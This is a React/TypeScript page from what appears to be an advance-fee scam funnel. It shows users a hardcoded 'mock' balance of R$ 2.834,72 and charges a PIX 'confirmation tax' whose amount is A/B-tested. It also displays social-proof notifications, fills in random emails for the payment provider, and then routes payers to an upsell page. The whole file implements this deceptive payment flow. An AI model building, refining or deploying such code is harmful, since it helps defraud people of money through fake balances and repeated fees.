import { useState, useEffect, useCallback, useMemo } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import FunnelConfirmTax from "@/components/funnel/FunnelConfirmTax";
import FunnelSocialProofNotifications from "@/components/funnel/FunnelSocialProofNotifications";
import FunnelProcessingScreen from "@/components/funnel/FunnelProcessingScreen";
import { FunnelPixPopup } from "@/components/funnel";
import { supabase } from "@/integrations/supabase/client";
import { trackPurchasePixelOnce, trackInitiateCheckoutPixel } from "@/lib/tiktokPixel";
import { usePaymentCheck } from "@/hooks/usePaymentCheck";
import { usePixGeneration } from "@/hooks/usePixGeneration";
import { useLeadData } from "@/hooks/useLeadData";
import { generateRandomEmail } from "@/lib/generateRandomEmail";
import { getTaxABVariant } from "@/lib/abTest";

interface LocationState {
  pixKey?: string;
  pixKeyType?: string;
  leadName?: string;
  leadEmail?: string;
}

const FunnelConfirmTaxPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as LocationState | null;

  const [showPixPopup, setShowPixPopup] = useState(false);
  const [pixCopied, setPixCopied] = useState(false);
  const [showProcessing, setShowProcessing] = useState(false);

  // A/B test: assign variant once per session
  const abVariant = useMemo(() => getTaxABVariant(), []);

  const leadPixKey = state?.pixKey || "";
  const leadPixKeyType = state?.pixKeyType || "E-mail";
  const leadName = state?.leadName || "Usuário";
  const leadEmail = state?.leadEmail || "cliente@pagamento.com";

  const { generatePix, isGenerating, pixData } = usePixGeneration();
  const { leadCpf, leadName: storedLeadName } = useLeadData();

  // Callback para quando o pagamento for confirmado manualmente
  const handlePaymentConfirmed = useCallback(async () => {
    console.log('TAX: Manual payment confirmed. Navigating...');
    if (pixData?.transaction_id && pixData?.amount) {
      trackPurchasePixelOnce({
        transactionId: pixData.transaction_id,
        value: pixData.amount,
        contentId: 'tax',
      });
    }
    setShowPixPopup(false);
    setShowProcessing(true);
  }, [pixData]);

  const handleProcessingComplete = useCallback(() => {
    navigate('/funil/upsell-tenf', {
      state: { pixKey: leadPixKey, pixKeyType: leadPixKeyType },
    });
  }, [navigate, leadPixKey, leadPixKeyType]);

  const { isChecking, checkError, checkPayment } = usePaymentCheck({
    transactionId: pixData?.transaction_id,
    onPaymentConfirmed: handlePaymentConfirmed,
  });

  // Auto-check payment status when popup is open
  useEffect(() => {
    if (!showPixPopup || !pixData?.transaction_id) return;

    let cancelled = false;
    let didNavigate = false;

    const transactionId = pixData.transaction_id;
    const amount = pixData.amount;

    const goNext = async (source: string) => {
      if (didNavigate) return;
      didNavigate = true;
      console.log(`TAX: Payment confirmed (${source}). Navigating...`);

      if (transactionId && amount) {
        trackPurchasePixelOnce({
          transactionId,
          value: amount,
          contentId: 'tax',
        });
      }

      setShowPixPopup(false);
      setShowProcessing(true);
    };

    const checkPaymentStatus = async (source: string) => {
      if (cancelled || didNavigate) return;
      try {
        const { data: apiResult, error: apiError } = await supabase.functions.invoke('check-payment', {
          body: { transaction_id: transactionId }
        });

        if (apiError) {
          console.warn('TAX: API check error:', source, apiError);
          return;
        }

        if (apiResult?.status === 'paid') {
          goNext(source);
        }
      } catch (err) {
        console.warn('TAX: Error checking payment:', source, err);
      }
    };

    checkPaymentStatus('initial');

    const interval = window.setInterval(() => checkPaymentStatus('poll'), 2500);

    const channel = supabase
      .channel(`payment-status-tax-${transactionId}`)
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'pix_payments',
        filter: `transaction_id=eq.${transactionId}`
      }, (payload) => {
        if (payload.new?.status === 'paid' || payload.new?.status === 'approved') {
          checkPaymentStatus('realtime');
        }
      })
      .subscribe();

    return () => {
      cancelled = true;
      window.clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, [showPixPopup, pixData, navigate, leadPixKey, leadPixKeyType]);

  const handleGeneratePix = async () => {
    // Fire InitiateCheckout pixel
    trackInitiateCheckoutPixel({ value: abVariant.amount, contentId: 'tax' });

    // If PIX already exists, just show the popup
    if (pixData) {
      setShowPixPopup(true);
      return;
    }

    const emailToSend = leadPixKeyType === "E-mail" && leadPixKey
      ? leadPixKey
      : generateRandomEmail(sessionStorage.getItem("lead_name") || undefined);

    const result = await generatePix({
      amount: abVariant.amount,
      name: sessionStorage.getItem("lead_name") || undefined,
      email: emailToSend,
      cpf: sessionStorage.getItem("lead_cpf") || undefined,
      payment_type: 'tax',
      ab_variant: abVariant.id,
    });

    if (result) {
      setShowPixPopup(true);
    }
  };

  const handleCopyPixCode = () => {
    if (pixData?.pix_code) {
      navigator.clipboard.writeText(pixData.pix_code);
      setPixCopied(true);
      setTimeout(() => setPixCopied(false), 2000);
    }
  };

  const mockProps = {
    balance: "R$ 2.834,72",
    pixKey: leadPixKey,
    pixKeyType: leadPixKeyType as "CPF" | "E-mail" | "Celular" | "Chave Aleatória",
    pixName: storedLeadName || leadName,
    onGeneratePix: handleGeneratePix,
    isGenerating,
    taxAmount: abVariant.formattedAmount,
    taxAnchor: abVariant.anchorAmount,
    taxDiscount: abVariant.discountPercent,
    leadCpf,
    leadName: storedLeadName || leadName,
  };

  return (
    <div className="min-h-screen bg-black/50 flex items-end justify-center pb-0">
      <div className="w-full max-w-md">
        <FunnelConfirmTax {...mockProps} />
      </div>

      <FunnelSocialProofNotifications />

      {showPixPopup && pixData && (
        <FunnelPixPopup
          pixData={pixData}
          onClose={() => setShowPixPopup(false)}
          onCopy={handleCopyPixCode}
          isCopied={pixCopied}
          title="Taxa de Confirmação"
          amount={abVariant.formattedAmount}
          showRefundMessage={true}
          onManualCheck={checkPayment}
          isCheckingPayment={isChecking}
          checkError={checkError}
        />
      )}

      {showProcessing && (
        <FunnelProcessingScreen onComplete={handleProcessingComplete} />
      )}
    </div>
  );
};

export default FunnelConfirmTaxPage;
